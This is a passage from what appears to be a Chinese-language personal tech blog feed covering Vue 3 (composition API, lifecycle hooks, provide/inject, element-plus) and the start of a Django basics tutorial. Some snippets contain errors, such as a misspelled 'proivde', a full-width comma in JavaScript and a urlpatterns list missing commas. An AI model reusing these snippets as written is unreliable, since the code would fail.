class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;about&quot;&gt;</span><br><span class="line">    &lt;!-- 直接写路径即可 --&gt;</span><br><span class="line">&lt;router-link to=&quot;/about/us&quot;&gt;关于我们&lt;/router-link&gt; </span><br><span class="line">    &lt;router-link to=&quot;/about/info&quot;&gt;关于信息&lt;/router-link&gt;</span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="六、Vue3"><a href="#六、Vue3" class="headerlink" title="六、Vue3"></a>六、Vue3</h2><h3 id="1-升级"><a href="#1-升级" class="headerlink" title="1 升级"></a>1 升级</h3><blockquote><p>六大亮点：</p><ul><li>Performance：性能更比Vue 2.0强。</li><li>Tree shaking support：可以将无用模块”剪辑“，仅打包需要的。</li><li>composition API：组合API</li><li>Fragment, Teleport, Suspense：”碎片“，Teleport即Protal传送门，”悬念“</li><li>Better TypeScript support：更优秀的Ts支持（Vue3的底层是Ts）</li><li>Custom Renderer APl：暴露了自定义渲染API</li></ul></blockquote><h3 id="2-组合式API"><a href="#2-组合式API" class="headerlink" title="2 组合式API"></a>2 组合式API</h3><blockquote><p>Vue3组合了API，在<code>setup()</code>中，可以定义数据、方法、props和context等。</p><p>在2.x中，组件的方法中可以通过this获取到当前组件的实例，并执行data变量的修改，方法的调用，组件的通信等等，但是在3.x中，setup()在beforeCreate和created时机就已调用，无法使用和2.x一样的this但是可以通过接收<code>setup(props,ctx)</code>的方法，获取到当前组件的实例和props。总之，在setup中，this指向的是<code>undefined</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;hello&quot;&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li v-for=&quot;(item,index) in names.list&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;button @click=&quot;clickHandle&quot;&gt;按钮&lt;/button&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123; ref, reactive &#125; from &quot;vue&quot;</span><br><span class="line">export default &#123;</span><br><span class="line">name:&#x27;Helloworld&#x27;,</span><br><span class="line">// 定义props接收数据</span><br><span class="line">props:&#123;</span><br><span class="line">msg:String</span><br><span class="line">&#125;,</span><br><span class="line">//组合式API（props传参，ctx表示this）</span><br><span class="line">setup(props,ctx) &#123; </span><br><span class="line">// ref：定义简单数据</span><br><span class="line">const message = ref(&quot;我是消息&quot;)</span><br><span class="line">//reactive：定义复杂数据（数组、对象）</span><br><span class="line">const names = reactive(&#123;</span><br><span class="line">list: [ &quot;yui&quot;, &quot;mio&quot; , &quot;tsumugi&quot;],</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 定义函数</span><br><span class="line">function clickHandle()&#123;</span><br><span class="line">message.value=&quot;我是新的消息&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// props赋值</span><br><span class="line">const msg = props.msg;</span><br><span class="line"></span><br><span class="line">// 查看ctx的数据（包括attrs、emit、slots等）</span><br><span class="line">console.log(ctx);</span><br><span class="line"></span><br><span class="line">// 定义的数据需要返回出去才能被使用</span><br><span class="line">return&#123;</span><br><span class="line">message,</span><br><span class="line">names,</span><br><span class="line">// 函数也需要返回</span><br><span class="line">clickHandle,</span><br><span class="line">msg</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 直接将setup写到标签中，不用return --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;hello&quot;&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &lt;li v-for=&quot;(item, index) in names.list&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">    &lt;button @click=&quot;clickHandle&quot;&gt;按钮&lt;/button&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;/p&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ref, reactive &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">// 获取props数据</span><br><span class="line">const props = defineProps(&#123;</span><br><span class="line">  msg: String</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// ref：定义简单数据</span><br><span class="line">const message = ref(&quot;我是消息&quot;)</span><br><span class="line"></span><br><span class="line">// reactive：定义复杂数据（数组、对象）</span><br><span class="line">const names = reactive(&#123;</span><br><span class="line">  list: [&quot;yui&quot;, &quot;mio&quot;, &quot;tsumugi&quot;],</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 定义函数</span><br><span class="line">function clickHandle() &#123;</span><br><span class="line">  message.value = &quot;我是新的消息&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// props赋值</span><br><span class="line">const msg = props.msg</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="3-setup使用生命周期函数"><a href="#3-setup使用生命周期函数" class="headerlink" title="3 setup使用生命周期函数"></a>3 setup使用生命周期函数</h3><div class="table-container"><table><thead><tr><th>Options API</th><th>Hook inside setup</th></tr></thead><tbody><tr><td>beforeCreate</td><td><code>Not needed*</code></td></tr><tr><td>created</td><td><code>Not needed*</code></td></tr><tr><td>beforeMount</td><td>onBeforeMount</td></tr><tr><td>mounted</td><td>onMounted</td></tr><tr><td>beforeUpdate</td><td>onBeforeUpdate</td></tr><tr><td>updated</td><td>onUpdated</td></tr><tr><td>beforeUnmount</td><td>onBeforeUnmount</td></tr><tr><td>unmounted</td><td>onUnmounted</td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;hello&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; onMounted &#125; from &quot;vue&quot;;</span><br><span class="line"></span><br><span class="line">// 比以前有优势，以前同一个生命周期函数只能存在一个，现在可以存在多个</span><br><span class="line">onMounted(() =&gt;&#123; console.log(&quot;生命周期函数:onMounted1&quot;);&#125;);</span><br><span class="line">onMounted(() =&gt;&#123; console.log(&quot;生命周期函数:onMounted2&quot;);&#125;);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="4-依赖注入"><a href="#4-依赖注入" class="headerlink" title="4 依赖注入"></a>4 依赖注入</h3><blockquote><p><code>Provide / lnject</code>：</p><ul><li><code>provide()</code>和<code>inject()</code>可以实现嵌套组件之间的数据传递。</li><li>这两个函数只能在<code>setup()</code>函数中使用。</li><li>父级组件中使用<code>provide()</code>函数向下传递数据。</li><li>子级组件中使用<code>inject()</code>获取上层传递过来的数据。</li><li>不限层级。</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 父组件的script --&gt;</span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; provide &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">proivde(&quot;customVal&quot;, &quot;我是父组件向子组件传递的值&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 子组件的script --&gt;</span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; inject &#125; from &quot;vue&quot;</span><br><span class="line"></span><br><span class="line">const customVal = inject(&quot;customVal&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="七、element-plus"><a href="#七、element-plus" class="headerlink" title="七、element-plus"></a>七、element-plus</h2><h3 id="1-基础使用"><a href="#1-基础使用" class="headerlink" title="1 基础使用"></a>1 基础使用</h3><blockquote><p>css组件库</p><p>必须安装：<code>npm i element-plus</code></p><p>按需引入额外安装：</p><ul><li><code>npm i unplugin-vue-components</code></li><li><code>npm i unplugin-auto-import</code></li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全部组件引入</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> E1ementPlus <span class="keyword">from</span> <span class="string">&#x27;element-plus&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;element-plus/dist/index.css&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line">app.<span class="title function_">use</span>(E1ementPlus)</span><br><span class="line">app . <span class="title function_">mount</span>( <span class="string">&#x27; #app &#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 部分组件引入（修改vite.config.js）</span></span><br><span class="line"><span class="keyword">import</span> &#123; defineConfig &#125; <span class="keyword">from</span> <span class="string">&#x27;vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">AutoImport</span> <span class="keyword">from</span> <span class="string">&#x27;unplugin-auto-import/vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Components</span> <span class="keyword">from</span> <span class="string">&#x27;unplugin-vue-components/vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ElementPlusResolver</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;unplugin-vue-components/resolvers&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="title class_">AutoImport</span>(&#123;</span><br><span class="line">      <span class="attr">resolvers</span>: [<span class="title class_">ElementPlusResolver</span>()],</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="title class_">Components</span>(&#123;</span><br><span class="line">      <span class="attr">resolvers</span>: [<span class="title class_">ElementPlusResolver</span>()],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;el-row class=&quot;mb-4&quot;&gt;</span><br><span class="line">    &lt;el-button&gt;Default&lt;/el-button&gt;</span><br><span class="line">    &lt;el-button type=&quot;primary&quot;&gt;Primary&lt;/el-button&gt;</span><br><span class="line">    &lt;el-button type=&quot;success&quot;&gt;Success&lt;/el-button&gt;</span><br><span class="line">    &lt;el-button type=&quot;info&quot;&gt;Info&lt;/el-button&gt;</span><br><span class="line">    &lt;el-button type=&quot;warning&quot;&gt;Warning&lt;/el-button&gt;</span><br><span class="line">    &lt;el-button type=&quot;danger&quot;&gt;Danger&lt;/el-button&gt;</span><br><span class="line">  &lt;/el-row&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h3 id="2-字体处理"><a href="#2-字体处理" class="headerlink" title="2 字体处理"></a>2 字体处理</h3><blockquote><p>字体使用需要额外安装。</p><p>安装：<code>npm i @element-plus/icons-vue</code></p><p>创建文件：<code>src/plugins/icons.js</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// icons.js</span></span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> components <span class="keyword">from</span> <span class="string">&quot;@element-plus/icons-vue&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line"><span class="attr">install</span>: <span class="function">(<span class="params">app</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> components) &#123;</span><br><span class="line"><span class="keyword">const</span> componentconfig = components[key];</span><br><span class="line">app.<span class="title function_">component</span>(componentconfig.<span class="property">name</span>，componentconfig);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.js引用</span></span><br><span class="line"><span class="keyword">import</span> elementIcon <span class="keyword">from</span> <span class="string">&quot;./plugins/icons&quot;</span></span><br><span class="line">app.<span class="title function_">use</span>(elementIcon)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 使用图标 --&gt;</span><br><span class="line">&lt;el-icon class=&quot;expand&quot; color=&quot;#409EFC&quot; :size=&quot;30&quot;&gt;</span><br><span class="line">&lt;expand /&gt;</span><br><span class="line">&lt;/el-icon&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web前端 </tag>
            
            <tag> web框架 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django</title>
      <link href="/posts/c0eb71d0.html"/>
      <url>/posts/c0eb71d0.html</url>
      
        <content type="html"><![CDATA[<h1 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h1><blockquote><p><a href=".\a378bd8e">text::python</a></p><p><a href="https://docs.djangoproject.com/zh-hans/4.2/">official::Django</a></p></blockquote><h2 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h2><h3 id="1-简单流程"><a href="#1-简单流程" class="headerlink" title="1 简单流程"></a>1 简单流程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.安装</span></span><br><span class="line">pip install django</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.终端中新建项目</span></span><br><span class="line">cd path</span><br><span class="line">django-admin startproject &lt;project_name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.新建app（工程主目录下，任一）</span></span><br><span class="line">python manage.py startapp &lt;app_name&gt;</span><br><span class="line">django-admin startapp &lt;app_name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.注册app（在setting.py修改）</span></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    ... ,</span><br><span class="line">    &lt;app_name&gt;.apps.&lt;app_name&gt;Config</span><br><span class="line">] </span><br><span class="line"><span class="comment"># 案例：app名字是Main</span></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">&#x27;django.contrib.admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.auth&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.contenttypes&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.sessions&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.messages&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.staticfiles&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Main.apps.MainConfig&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.编写urls（详细在urls.py中）</span></span><br><span class="line"><span class="keyword">from</span> Main <span class="keyword">import</span> views</span><br><span class="line">urlpatterns = [  </span><br><span class="line">    path(<span class="string">&#x27;index/&#x27;</span>, views.index)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.编写views（详细在views.py中）</span></span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render,HttpResponse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello world&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7.Django，启动！（注意路径）</span></span><br><span class="line">python manage.py runserver [port]</span><br></pre></td></tr></table></figure><h3 id="2-默认项目文件"><a href="#2-默认项目文件" class="headerlink" title="2 默认项目文件"></a>2 默认项目文件</h3><h4 id="2-1-manage-py"><a href="#2-1-manage-py" class="headerlink" title="2.1 manage.py"></a>2.1 manage.py</h4><blockquote><p>项目管理、启动项目、创建APP、数据管理。</p><p>代码不需要修改。但需要经常使用。</p></blockquote><h4 id="2-2-init-py"><a href="#2-2-init-py" class="headerlink" title="2.2 /init.py"></a>2.2 /init.py</h4><p>&gt;</p><h4 id="2-3-asgi-py"><a href="#2-3-asgi-py" class="headerlink" title="2.3 asgi.py"></a>2.3 asgi.py</h4><blockquote><p>异步式接受网络请求。</p><p>代码不需要修改。</p></blockquote><h4 id="2-4-wsgi-py"><a href="#2-4-wsgi-py" class="headerlink" title="2.4 wsgi.py"></a>2.4 wsgi.py</h4><blockquote><p>同步式接受网络请求。</p><p>代码不需要修改。</p></blockquote><h4 id="2-5-urls-py"><a href="#2-5-urls-py" class="headerlink" title="2.5 urls.py"></a>2.5 urls.py</h4><blockquote><p>路由，URL和views函数的对应关系。</p><p>经常修改的文件。</p><p>如果导入时爆红，可以按如下方式设置：文件——设置——项目：Web——项目结构——添加内容根——项目的根文件夹（app和默认项目文件的根）</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加路径，Main是app，关联url和views</span></span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Main <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    <span class="comment"># path(&#x27;admin/&#x27;, admin.site.urls),</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 路径：127.0.0.1:8080</span></span><br><span class="line">    path(<span class="string">&#x27;&#x27;</span>, views.first)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 路径：127.0.0.1:8000/index</span></span><br><span class="line">    path(<span class="string">&#x27;index/&#x27;</span>, views.index)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># name：给URL命名。这个名称可以在模板、views.py（反向解析URL）等地方使用</span></span><br><span class="line">    path(<span class="string">&#x27;apple.html&#x27;</span>, views.index, name=<span class="string">&#x27;ap&#x27;</span>)</span><br><span class="line">    <span class="comment"># templates中html使用如下</span></span><br><span class="line">    &lt;a href=<span class="string">&quot;&#123;% url &#x27;ap&#x27; %&#125;&quot;</span>&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 带参链接（根据nid值不同生成的链接不同，案例如下。views中的函数要有nid这个参数）</span></span><br><span class="line">    <span class="comment"># http://127.0.0.1:8000/depart/2/edit</span></span><br><span class="line">    <span class="comment"># http://127.0.0.1:8000/depart/6/edit</span></span><br><span class="line">    path(<span class="string">&#x27;depart/&lt;int:nid&gt;/edit/&#x27;</span>, view.depart_edit)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="2-6-setting-py"><a href="#2-6-setting-py" class="headerlink" title="2.6 setting.py"></a>2.6 setting.py</h4><blockquote><p>项目配置。</p><p>经常修改的文件。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注册APP</span></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    ... ,</span><br><span class="line">    <span class="string">&#x27;Main.apps.MainConfig&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模板配置（在根目录下配置一个templates文件，一般不需要，若存在建议删除）</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">TEMPLATES = [      </span><br><span class="line">        <span class="string">&#x27;DIRS&#x27;</span>: [os.path.join(BASE_DIR,<span class="string">&#x27;templates&#x27;</span>)],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 静态文件路径</span></span><br><span class="line">STATIC_URL = <span class="string">&#x27;static/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库（推荐改成mysql）</span></span><br><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;dbname&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PORT&#x27;</span>: <span class="number">3306</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误信息显示（默认：en-us）</span></span><br><span class="line">LANGUAGE_CODE = <span class="string">&quot;zh-hans&quot;</span></span><br></pre></td></tr></table></figure><h3 id="3-APP"><a href="#3-APP" class="headerlink" title="3 APP"></a>3 APP</h3><h4 id="3-1-app定义"><a href="#3-1-app定义" class="headerlink" title="3.1 app定义"></a>3.1 app定义</h4><blockquote><p>项目中对功能进行分块管理。</p><p>例如：</p><ul><li>app，用户管理。【表结构、函数、HTML、CSS】</li><li>app，订单管理。【表结构、函数、HTML、CSS】</li><li>app，后台管理。【表结构、函数、HTML、CSS】</li></ul></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建app（工程主目录下，任一）</span></span><br><span class="line">python manage.py startapp &lt;app_name&gt;</span><br><span class="line">django-admin startapp &lt;app_name&gt;</span><br></pre></td></tr></table></figure><h4 id="3-2-Migrations-init-py"><a href="#3-2-Migrations-init-py" class="headerlink" title="3.2 Migrations/init.py"></a>3.2 Migrations/init.py</h4><blockquote><p>当数据库内容进行修改时进行记录。</p><p>固定，不用修改。</p></blockquote><h4 id="3-3-admin-py"><a href="#3-3-admin-py" class="headerlink" title="3.3 admin.py"></a>3.3 admin.py</h4><blockquote><p>django默认提供了admin后台管理。</p><p>固定，不用修改。</p></blockquote><h4 id="3-4-apps-py"><a href="#3-4-apps-py" class="headerlink" title="3.4 apps.py"></a>3.4 apps.py</h4><blockquote><p>app的启动类</p><p>固定，不用修改。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.apps <span class="keyword">import</span> AppConfig</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainpageConfig</span>(<span class="title class_ inherited__">AppConfig</span>):</span><br><span class="line">    <span class="comment"># 创建数据库默认增加一条bigint的id自增数据</span></span><br><span class="line">    default_auto_field = <span class="string">&#x27;django.db.models.BigAutoField&#x27;</span></span><br><span class="line">    <span class="comment"># app名称</span></span><br><span class="line">    name = <span class="string">&#x27;mainPage&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="3-5-models-py"><a href="#3-5-models-py" class="headerlink" title="3.5 models.py"></a>3.5 models.py</h4><blockquote><p>对数据库进行操作。</p><p>经常修改。</p><p>执行命令前需要注册app。</p><p>Django4对MySQL数据库版本要求是要大于8。</p><p>下面试简单案例，详细内容在ORM框架中。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建表（类一定要继承models.Model）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserInfo</span>(models.Model):</span><br><span class="line">    name = models.CharField(max_length = <span class="number">32</span>)</span><br><span class="line">    password = models.CharField(max_length = <span class="number">64</span>)</span><br><span class="line">    age = models.IntegerField()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-6-tests-py"><a href="#3-6-tests-py" class="headerlink" title="3.6 tests.py"></a>3.6 tests.py</h4><blockquote><p>单元测试。</p><p>固定，不用修改。</p></blockquote><h4 id="3-7-views-py"><a href="#3-7-views-py" class="headerlink" title="3.7 views.py"></a>3.7 views.py</h4><blockquote><p>视图函数。</p><p>经常修改。</p><p>定义的函数要带有request参数：</p><ul><li>request是一个对象，封装了用户发送过来的所有数据。</li></ul><p>templates文件夹：</p><ul><li>若要在函数中返回模板文件，则在对应view的app下添加templates文件夹，然后在文件夹中写入html文件。</li><li>框架在寻找templates时，会根据app的注册顺序，逐一的去寻找他们的templates目录。</li><li>如果在setting的TEMPLATES中配置了DIRS，则会最先找DIRS中的路径，再按app的注册顺序找。</li></ul><p>static文件夹：</p><ul><li>用来存放css、js、img、plugins等静态文件，然后在html中导入是路径改成<code>/static/css/...</code>。（注意最前面有一个斜杠）</li><li>导入方式可以写成上述的绝对路径，但是不建议。建议在html头部加上<code>&#123;% load static %&#125;</code>，然后按<code>&#123;% static 'css/...' %&#125;</code>方式导入。</li></ul></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 简单案例（在urls绑定好关系即可访问）</span></span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render,HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写的函数必须有request参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello world&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回templates中的页面</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_list</span>(<span class="params">request</span>):</span><br><span class="line"><span class="keyword">return</span> render(request, <span class="string">&quot;user_list.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 带参，可以给urls传递参数</span></span><br><span class="line"><span class="comment"># http://127.0.0.1:8000/depart/2/edit</span></span><br><span class="line"><span class="comment"># http://127.0.0.1:8000/depart/6/edit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">depart_edit</span>(<span class="params">request, nid</span>):</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;depart_edit.html&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入静态文件方法1--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/css/main.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--导入静态文件方法2--&gt;</span></span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;% static &#x27;css/main.css&#x27; %&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-系统类"><a href="#4-系统类" class="headerlink" title="4 系统类"></a>4 系统类</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将指定语句标记为安全（这样若语句是html标签语句将会直接执行）</span></span><br><span class="line"><span class="keyword">from</span> django.utils.safestring <span class="keyword">import</span> mark_safe</span><br><span class="line"></span><br><span class="line">page_str_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):</span><br><span class="line">    ele = <span class="string">&quot;&lt;li&gt;&lt;a href = &#x27;?page = &#123;&#125;&#x27;&gt;&#123;&#125;&lt;/a&gt;&lt;/li&gt;&quot;</span>.<span class="built_in">format</span>(i, i)</span><br><span class="line">    page_str_list.append(ele)</span><br><span class="line">page_string = mark_safe(<span class="string">&quot;&quot;</span>.join(page_str_list))</span><br></pre></td></tr></table></figure><h2 id="二、数据处理"><a href="#二、数据处理" class="headerlink" title="二、数据处理"></a>二、数据处理</h2><h3 id="1-向浏览器发送参数"><a href="#1-向浏览器发送参数" class="headerlink" title="1 向浏览器发送参数"></a>1 向浏览器发送参数</h3><blockquote><p>写在views的函数中。</p><p>想在html中显示参数值时，可以在html中写上<code>&#123;&#123;para&#125;&#125;</code>，然后在python函数中传入字典即可。</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--普通取值--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> n1的值是&#123;&#123;n1&#125;&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> 